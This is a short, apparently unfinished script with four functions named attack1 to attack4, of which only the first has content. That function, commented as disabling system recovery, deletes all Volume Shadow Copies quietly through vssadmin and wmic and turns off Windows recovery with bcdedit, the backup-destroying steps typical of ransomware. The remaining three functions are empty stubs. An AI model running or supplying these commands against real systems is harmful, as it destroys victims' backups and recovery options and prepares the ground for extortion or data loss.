function attack1()
{
#dissables system recovery methods
vssadmin.exe delete shadows /all /quiet
wmic.exe Shadowcopy Delete
bcdedit /set {default} recoveryenabled No
}

function attack2()
{

}

function attack3()
{

}

function attack4()
{

}

